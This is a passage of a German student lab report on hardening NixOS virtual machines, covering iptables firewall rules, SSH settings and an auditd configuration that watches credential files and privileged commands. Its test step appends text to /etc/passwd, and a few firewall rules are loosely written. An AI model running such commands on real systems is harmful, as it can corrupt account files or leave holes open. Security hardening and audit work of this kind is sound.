      iptables -A OUTPUT -d 192.168.8.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.9.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.10.0/24 -j ACCEPT
      # docker compose
      iptables -A OUTPUT -d 54.227.20.253 -j ACCEPT
      iptables -A OUTPUT -d 54.236.113.205 -j ACCEPT
      iptables -A OUTPUT -d 54.198.86.24 -j ACCEPT
      # wpad proxy
      iptables -A OUTPUT -d 129.187.254.50 -j ACCEPT
      iptables -A OUTPUT -d 129.187.254.49 -j ACCEPT 
      # git (https://serverfault.com/questions/682373/setting-up-iptables-filter-to-allow-git)
      iptables -A INPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
      iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
      iptables -A INPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT


      # --- Database (client) ---
      iptables -A OUTPUT -p tcp --sport 5432 -m conntrack --ctstate NEW -j ACCEPT

      # --- NFS (client) ---
      iptables -A OUTPUT -p tcp --dport 111 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p udp --dport 111 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 2049 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p udp --dport 2049 -m conntrack --ctstate NEW -j ACCEPT

      # --- Samba (client) ---
      iptables -A OUTPUT -p udp --dport 137 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p udp --dport 138 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 139 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 445 -m conntrack --ctstate NEW -j ACCEPT

      # --- Mail (client) ---
      # sending of mail
      iptables -A OUTPUT -p tcp --dport 25 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 587 -m conntrack --ctstate NEW -j ACCEPT
      # retrieval of mail
      iptables -A OUTPUT -p tcp --dport 143 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 993 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 110 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 995 -m conntrack --ctstate NEW -j ACCEPT

      # --- LDAP (client) ---
      iptables -A OUTPUT -p tcp --dport 389 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 636 -m conntrack --ctstate NEW -j ACCEPT

      # --- prometheus (exporter/server) ---
      iptables -A INPUT -p tcp --dport 9100 -s 192.168.3.10 -j ACCEPT
      iptables -A INPUT -p tcp --dport 9101 -s 192.168.3.10 -j ACCEPT
    '';
    ```

    ```nix
    # vm-network-config.nix
    firewall.extraCommands = '' 
      # by default: Drop all packages (in and outgoing) 
      iptables -P INPUT DROP 
      iptables -P FORWARD DROP 
      iptables -P OUTPUT DROP

      # by default: Disable connection tracking for HTTP and HTTPS
      iptables -t raw -A PREROUTING -p tcp --dport 80 -j NOTRACK  
      iptables -t raw -A OUTPUT -p tcp --sport 80 -j NOTRACK
      iptables -t raw -A PREROUTING -p tcp --dport 443 -j NOTRACK 
      iptables -t raw -A OUTPUT -p tcp --sport 443 -j NOTRACK

      # Allow: loopback
      iptables -A INPUT -i lo -j ACCEPT
      iptables -A OUTPUT -o lo -j ACCEPT

      # Allow established/related connections
      iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
      iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
      iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT


      # --- SSH (access to the router) ---
      iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -j ACCEPT

      # --- ICMP --- 
      iptables -A INPUT -p icmp -j ACCEPT
      iptables -A OUTPUT -p icmp -j ACCEPT

      # --- DNS (client) ---
      iptables -A OUTPUT -p udp --dport 53 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 53 -m conntrack --ctstate NEW -j ACCEPT

      # --- DHCP (client) ---
      iptables -A OUTPUT -p udp --dport 67 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p udp --dport 68 -m conntrack --ctstate NEW -j ACCEPT

      # --- HTTP/HTTPS (client) ---       
      iptables -A OUTPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 443 -m conntrack --ctstate NEW -j ACCEPT


      # Outgoing only to specific IPs
      # gitlab
      iptables -A OUTPUT -d 131.159.0.0/16 -j ACCEPT
      # nixos updater
      iptables -A OUTPUT -d 151.101.2.217 -j ACCEPT  
      iptables -A OUTPUT -d 151.101.130.217 -j ACCEPT
      iptables -A OUTPUT -d 151.101.66.217 -j ACCEPT
      iptables -A OUTPUT -d 151.101.194.217 -j ACCEPT
      iptables -A OUTPUT -d 146.75.118.217 -j ACCEPT
      # praktikum
      iptables -A OUTPUT -d 192.168.1.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.2.0/24 -j ACCEPT 
      iptables -A OUTPUT -d 192.168.3.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.4.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.5.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.6.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.7.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.8.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.9.0/24 -j ACCEPT
      iptables -A OUTPUT -d 192.168.10.0/24 -j ACCEPT
      # allow clamav
      iptables -A OUTPUT -d 104.16.218.84 -j ACCEPT
      iptables -A OUTPUT -d 104.16.219.84 -j ACCEPT
      # wpad proxy
      iptables -A OUTPUT -d 129.187.254.50 -j ACCEPT
      iptables -A OUTPUT -d 129.187.254.49 -j ACCEPT 
      # git (https://serverfault.com/questions/682373/setting-up-iptables-filter-to-allow-git)
      iptables -A INPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
      iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
      iptables -A INPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT


      # --- Database (server) --- (only vm4)
      iptables -A INPUT -p tcp --dport 5432 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT

      # --- Homeassistant (server) --- (only vm5)
      iptables -A INPUT -p tcp --dport 8123 -m conntrack --ctstate NEW -j ACCEPT

      # --- HTTP/HTTPS (server) --- (only vm6)
      iptables -A INPUT -p tcp --dport 80 -s 192.168.0.0/16 -j ACCEPT  
      iptables -A INPUT -p tcp --dport 443 -s 192.168.0.0/16 -j ACCEPT

      # --- LDAP (server) --- (only vm7)
      iptables -A INPUT -p tcp --dport 389 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p tcp --dport 636 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT

      # --- NFS (server) --- (only vm8)
      # Allow rpcbind
      iptables -A INPUT -p tcp --dport 111 -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p udp --dport 111 -s 192.168.0.0/16 -j ACCEPT
      # Allow mountd (fixed to port 20048)
      iptables -A INPUT -p tcp --dport 20048 -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p udp --dport 20048 -s 192.168.0.0/16 -j ACCEPT
      # Allow NFS itself
      iptables -A INPUT -p tcp --dport 2049 -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p udp --dport 2049 -s 192.168.0.0/16 -j ACCEPT
      # Allow NLM (nlockmgr) for file locking if needed
      iptables -A INPUT -p udp --dport 37373 -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p tcp --dport 43027 -s 192.168.0.0/16 -j ACCEPT

      # --- Samba (server) --- (only vm8)
      iptables -A INPUT -p udp --dport 137 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p udp --dport 138 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p tcp --dport 139 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p tcp --dport 445 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT

      # --- Mail (server) --- (only vm9)
      # Reception of mail
      iptables -A INPUT -p tcp --dport 25 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p tcp --dport 587 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      # Retrieval of mail
      iptables -A INPUT -p tcp --dport 143 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p tcp --dport 993 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p tcp --dport 110 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      iptables -A INPUT -p tcp --dport 995 -m conntrack --ctstate NEW -s 192.168.0.0/16 -j ACCEPT
      # Outgoing mail
      iptables -A OUTPUT -p tcp --dport 25 -d 192.168.0.0/16 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 25 -d 131.159.254.10 -m conntrack --ctstate NEW -j ACCEPT

      # --- prometheus (collector/client) --- (only vm10)
      iptables -A OUTPUT -p tcp --dport 9100 -d 192.168.3.0/24 -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 9101 -d 192.168.3.0/24 -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 9090 -d 192.168.3.0/24 -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 9330 -d 192.168.3.0/24 -j ACCEPT # ldap
      iptables -A OUTPUT -p tcp --dport 9153 -d 192.168.3.0/24 -j ACCEPT  # coredns
      iptables -A OUTPUT -p tcp --dport 8080 -d 192.168.3.0/24 -j ACCEPT  # cadvisor
      # interface for prometheus
      iptables -A INPUT -p tcp --dport 9090 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A INPUT -p tcp --dport 3000 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A INPUT -p tcp --dport 9093 -m conntrack --ctstate NEW -j ACCEPT
      # forwarding
      iptables -I DOCKER-USER -j ACCEPT
      iptables -I FORWARD 1 -j DOCKER-USER


      # --- Database (client) ---
      iptables -A OUTPUT -p tcp --sport 5432 -m conntrack --ctstate NEW -j ACCEPT

      # --- NFS (client) ---
      iptables -A OUTPUT -p tcp --dport 111 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p udp --dport 111 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 2049 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p udp --dport 2049 -m conntrack --ctstate NEW -j ACCEPT

      # --- Samba (client) ---
      iptables -A OUTPUT -p udp --dport 137 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p udp --dport 138 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 139 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 445 -m conntrack --ctstate NEW -j ACCEPT

      # --- Mail (client) ---
      # sending of mail
      iptables -A OUTPUT -p tcp --dport 25 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 587 -m conntrack --ctstate NEW -j ACCEPT
      # retrieval of mail
      iptables -A OUTPUT -p tcp --dport 143 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 993 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 110 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 995 -m conntrack --ctstate NEW -j ACCEPT

      # --- LDAP (client) ---
      iptables -A OUTPUT -p tcp --dport 389 -m conntrack --ctstate NEW -j ACCEPT
      iptables -A OUTPUT -p tcp --dport 636 -m conntrack --ctstate NEW -j ACCEPT

      # --- prometheus (exporter/server) ---
      iptables -A INPUT -p tcp --dport 9100 -s 192.168.3.10 -j ACCEPT
      iptables -A INPUT -p tcp --dport 9101 -s 192.168.3.10 -j ACCEPT
      iptables -A INPUT -p tcp --dport 9090 -s 192.168.3.10 -j ACCEPT
      iptables -A INPUT -p tcp --dport 9330 -s 192.168.3.10 -j ACCEPT
      iptables -A INPUT -p tcp --dport 9153 -s 192.168.3.10 -j ACCEPT
      iptables -A INPUT -p tcp --dport 8080 -s 192.168.3.10 -j ACCEPT
    '';
    ```

- SSH: AllowTcpForwarding -> no, ClientAliveCountMax -> 2, MaxAuthTries -> 3, MaxSessions -> 2, TCPKeepAlive -> no, AllowAgentForwarding -> no

    ```nix
    # configuration.nix
    services.openssh = {
        enable = true;
        extraConfig = ''
            AllowTcpForwarding no
            ClientAliveCountMax 2
            MaxAuthTries 3
            MaxSessions 2
            TCPKeepAlive no
            AllowAgentForwarding no
        '';
    };
    ```

**Andere VMs:**
Leider nicht möglich da wir hierfür nicht die nötigen Rechte haben.

**Wirksamkeit:**
Recht effektiv um die Sicherheit der eigenen VMs zu überprüfen und zu verbessern.

### 3. Intrusion Detection System

Zum Schluss haben wir noch ein Intrusion Detection System (IDS) aufgesetzt. Hierfür haben wir auditd verwendet, ein Linux-Tool, das die Systemaufrufe überwacht und protokolliert. Es kann verwendet werden, um verdächtige Aktivitäten zu erkennen und zu verhindern. Hierfür haben wir die folgende bespielhafte Konfiguration auf `vm1` aufgesetzt:

```nix
{
  security.auditd.enable = true;

  # Log management settings
  security.audit = {
    enable = true;
  };

  # Define audit rules
  security.audit.rules = [
    # ==== File Integrity Monitoring ==== 
    # Monitor critical system files for changes
    "-w /etc/passwd -p wa -k passwd_changes"
    "-w /etc/shadow -p wa -k shadow_changes" 
    "-w /etc/ssh/sshd_config -p wa -k sshd_config_changes" 

    # ==== User Activity Monitoring ====
    # Track execution of privileged commands
    "-a always,exit -F path=/usr/bin/sudo -F perm=x -F auid>=1000 -F auid!=4294967295 -k privileged_sudo"
    "-a always,exit -F path=/bin/su -F perm=x -F auid>=1000 -F auid!=4294967295 -k privileged_su"
    # Monitor user logins and authentication
    "-w /var/log/auth.log -p rwxa -k auth_logs"

    # ==== System Call Monitoring ====
    # Detect suspicious use of chmod, chown, and mount
    "-a always,exit -F arch=b64 -S chmod -S chown -S mount -k suspicious_changes"
    "-a always,exit -F arch=b32 -S chmod -S chown -S mount -k suspicious_changes" 
    # Monitor file deletions by users
    "-a always,exit -F arch=b64 -S unlink -S rename -F auid>=1000 -F auid!=4294967295 -k file_deletion"   
    "-a always,exit -F arch=b32 -S unlink -S rename -F auid>=1000 -F auid!=4294967295 -k file_deletion"

    # ==== Security Configuration Monitoring ====   
    # Monitor changes to audit configuration
    "-w /etc/audit/ -p wa -k audit_config_changes"

    # ==== Nix-Specific Optimization ====
    # Exclude Nix store paths to reduce noise 
    "-a never,exit -F dir=/nix/store -k nix_store"
  ];
}
```

Nun fehlt noch die Konfiguration von auditd selbst:

- `mkdir -p /etc/audit`
- `nano /etc/audit/auditd.conf` ->

    ```bash
    log_file = /var/log/audit/audit.log
    log_format = ENRICHED
    max_log_file = 50
    max_log_file_action = ROTATE
    num_logs = 5
    space_left = 50
    admin_space_left = 25
    disk_full_action = SUSPEND
    disk_error_action = SUSPEND
    ```

nach einen `switch-rebuild` ist das System bereit für die Überwachung. Hier ein kleiner test um zu sehen ob alles funktioniert:

- `sudo echo "Test audit log entry" >> /etc/passwd`
- `sudo ausearch -k passwd_changes`
